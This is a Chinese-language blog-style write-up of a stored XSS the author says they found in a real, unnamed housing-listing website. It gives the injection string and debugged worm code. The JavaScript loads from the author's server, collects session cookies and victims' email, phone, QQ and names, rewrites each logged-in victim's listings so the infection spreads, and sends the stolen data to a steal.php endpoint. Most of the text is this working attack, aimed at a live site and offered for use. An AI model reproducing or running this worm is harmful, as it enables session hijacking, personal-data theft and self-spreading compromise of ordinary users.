漏洞挖掘

这一步简要说下过程, 后面主要讲漏洞利用、代码编写部分,


网站不方便公布, 需要的可以联系我, 下面用 www.x.com代指目标网站.


首先我注册了这家网站, 后台允许用户免费发布房源信息, 出租房、二手房, 下面图是进入后台后发布房源信息的表单

我们注意表单最后的选项 描述, 这里我填的是 fangfang52(前女友名字)


我们点击提交,下面查看提交后的浏览页面

这就是你发布后其他人可以浏览到的房源信息, 我在浏览器点右键选择查看网页源代码这个信息页面代码片段 如下图

注意我加粗的内容 content=“fangfang52” 这里的fangfang52就是上面我提到的发布时的描述选项


这个网站前面我探查了一些输入点, 很多地方都用了过滤, 可是这个地方呢? 没有任何过滤! 如果我们把 fangfang52 换成下面的字符串

(注意两边的引号也是输入内容)

"/><script src="http://www.my.com/p.js?sig=fangfang521"></script><x "

将 fangfang52 替换成上面后 如果后端没有过滤 那么 前段内容会变成如下
<meta name="description" content=""/><script src="http://www.my.com/p.js?sig=fangfang521"></script><x ""/>  

 我们用 "/>  闭合了前边的标签插入了我们的跨站脚本 
后面为了不引起浏览器渲染异常 用 <x " 闭合


浏览器成功渲染了我们的跨站代码! 至此一个存储型xss诞生, 好吧, 我挖到漏洞大概只用了一个多小时


漏洞利用

介绍了漏洞的形成, 下面介绍编写代码利用漏洞


思路:

我们的跨站脚本在用户浏览房源信息页面时会加载,

如果这个用户是登陆状态,那么用ajax技术去修改用户发布的房源信息, 将造成xss的那个描述选项修改为上面的xss代码如何?

这样修改后如果有另一个已登陆的用户查看上面被修改用户发布的信息会再次被修改! 这样一只蠕虫就诞生了…

下面直接附上调试通过的核心代码及详尽注释

/*
存放在自己的服务器的跨站脚本 http://www.my.com/p.js
*/

//我们的服务器
__SERVER__ = 'www.my.com'; //'127.0.0.1' 

// 感染标记 用来标记已感染用户, 不重复感染
// 同时如果后期需要修改代码的话 改变这个标记 用户那里也会重新感染更新
__SIG__ = 'sig=fangfang521';   

// 发生跨站的那个表单选项填入的数据
__PAYLOAD__ = '"/><script src="http://' + __SERVER__ + '/p.js?' + __SIG__ + '"></script><x "';

// 存放收集的用户信息、 cookie、受感染时间等
var userInfo = { userName: null, currentTime: new Date().toString() };

// 这个函数给元素添加事件 兼容浏览器
function addHandler(element, type, handler) {
    if(element.addEventListener){
        element.addEventListener(type, handler, false);
    } else if(element.attachEvent){
        element.attachEvent("on" + type, handler);
    } else {
        element["on" + type] = handler;
    }
}

// 远程动态加载js, 加载成功后调用callback回调
function loadScript(url, callback) {
    var e = document.createElement('script');
    e.type = 'text/javascript';
    e.src = url;

    if (e.attachEvent) {
        e.attachEvent('onreadystatechange', function(){
            if (window.event.srcElement.readyState === 'loaded') {
                callback();
            }
        });
    } else {
        e.onload = callback;
    }
    document.getElementsByTagName('head')[0].appendChild(e);
}


// 向window注册onload事件 等待文档加载完毕后再操作
addHandler(window,'load', function(){
    // 加载另一个js文件 http://www.my.com/js/payload.js
    //  等待加载完成在往后执行 payload.js后面介绍
    loadScript('http://' + __SERVER__ + '/js/payload.js', function(){
        console.log('document ready');
        // 收集cookie 
        userInfo.cookie = document.cookie;

        // 通过一个元素是否存在判断是否登陆状态 如果已登陆保存用户名
        try{
            userInfo.userName = document.getElementsByClassName('login-info')[0].firstChild.nodeValue.split(',')[1];
        } catch(e) {}

        // 这个页面有用户信息 email 电话 qq 姓名 收集下来
        function getUserInfo(callback){
            // 这个类似于jquery ajax的 post 自己编写的 可有可无
            $http.html('http://www.x.com/adminm.php?action=memberinfo', function(response){
                console.log('getUserInfo success');
                var form = response.forms['memberdetial'];

                // 收集用户信息传给回调
                callback({
                    email: form['fmdata[email]'].value,   // E-mail
                    phone: form['fmdata[lxdh]'].value,    // 联系电话
                    qq: form['fmdata[qq]'].value,         // QQ
                    name: form['fmdata[xingming]'].value  // 姓名
                });
            });
        }

        // 判断用户是否登陆
        if(userInfo.userName !== null) {
            getUserInfo(function(info) {
                // 保存收集到的用户信息到 userInfo
                for(var i in info){
                    userInfo[i] = info[i];
                }

                // 这个核心函数在payload.js 
                // 将用户发布的房源信息中的描述字段
                // 修改为 __PAYLOAD__  达到感染的目的
                infectAll(__PAYLOAD__);
            });

        } else {
            // 未登陆跳转至注册页面要求用户注册?
        }

        // 51la统计浏览量
        xss.loadScript('http://js.users.51.la/xxxxxxxx.js');
    });
});



//下面代码片段来自 payload.js

function infect(url, payload) {
    var baseUrl = 'http://www.x.com/adminm.php';
    url = baseUrl + url;
    // 发布信息管理页面 读出所有已发布的出租房信息管理页面链接
    /*
        房源分两种 2手房 出租房 两个表单完全一样, 只有请求的参数不一样
        上面url = baseUrl + url 得到请求的链接
        下面针对 2手房讲解
        第一个ajax请求 
        链接 http://www.x.com/adminm.php?action=chuzuarchives&chid=2&valid=1
        这个链接页面包含用户发布的所有2手房信息 我们读取这个页面
    */
    $.ajax({ url: url,
        dataType: 'text',
        error: function(xhr, text, obj){console.log('ajax error1:' + text);},

        success: function(dom){
            /*
                成功读取了包含所有2手房信息的页面 每一条信息对应一个已发布的房源信息表单
                用jquery定位所有的房源表单链接
            */
            $(dom).find('table:eq(1) .bg.bg2 .w40 a:even').each(function(){
                var link = baseUrl + this.href.match(/\?action.*/)[0];

                // 到这里 link就是修改已发布的房源信息的链接
                // 存在xss的那个描述选项就在这个链接的表单中 ajax get请求这个页面
                console.log('infecting: ' + link);
                // 请求一个发布的房源信息表单页面
                $.ajax({ url: link, dataType: "text",
                    success: function(response){

                        //定位存在xss的表单
                        var form = $(response).find('form');

                        // 判断响应中是否包含 __SIG__标记 如果已标记就是已被感染 直接返回跳过
                        if(response.indexOf(__SIG__) !== -1) {
                            console.log('aready infected: ' + link);
                            return;
                        }

                        // 这个表单选项就是有xss的 "描述" 选项    将其修改为__PAYLOAD__
                        form.find("textarea[name='fmdata[abstract]'").text(payload);
                        formUrl = baseUrl + form[0].action.match(/\?action.*/)[0];
                        console.log('formUrl: ' + formUrl);

                        // 对这个表单做了修改后 提交到服务器完成修改
                       $.ajax({ url: formUrl,
                            type: "POST",

                            /*
                                 提交数据这个地方 坑了我大半天时间解决 我说下怎么回事
                                 jquery中可以对表单调用serialize 将表单数据序列化并utf8编码作为提交数据
                                 可是这个页面编码是gbk! 手动正常提交表单数据会被浏览器编码为gbk 可以被服务器正确识别
                                 但是这里如果是utf8 服务器就不认了 提交失败!    
                                 这里的xss.serialize函数在payload.js中  是我自己写的将表单序列化并用gbk编码的函数
                            */
                            data: xss.serialize(form[0], 'gbk'),

                            success: function(data) {
                                // 如果提交修改成功的话 响应中会包含这个字符串 失败的话没有的
                                // 用这个标记判断是否修改成功 一旦成功 我们就感染了用户发布的一个房源信息
                                // 有任何登陆的人浏览这个信息的话 会再次受到感染
                                if(data.indexOf('setTimeout("window.location.repla') !== -1){
                                    console.log('infect success: ' + link);

                                    /*
                                        xss.upload函数也在payload.js中, 用来将收集到的用户信息 userInfo提交到我的服务器
                                        函数代码很短 直接注释贴出来

                                        xss.upload = function(url, data) {
                                            var data = (typeof data === "object") ? JSON.stringify(data) : data;    
                                            new Image().src = url + '?d=' + encodeURI(data);
                                        }
                                    */
                                    xss.upload('http://' + __SERVER__ + '/steal.php', userInfo);
                                } else {
                                    console.log('infect failed: ' + link);
                                }
                            },
                        });

                    }
                });

            });
        }
    });
}


// 这个函数对用户发布的2手房、出租房链接 调用 infect分别感染
// 最终感染用户发布的所有房源信息
function infectAll(payload){
    // 感染已发布的出租房
    infect('?action=chuzuarchives&chid=2&valid=1', payload);//&chid=2&valid=1');

    // 感染已发布的2手房
    infect('?action=chushouarchives&chid=3&valid=1', payload);//&chid=3&valid=1');
}
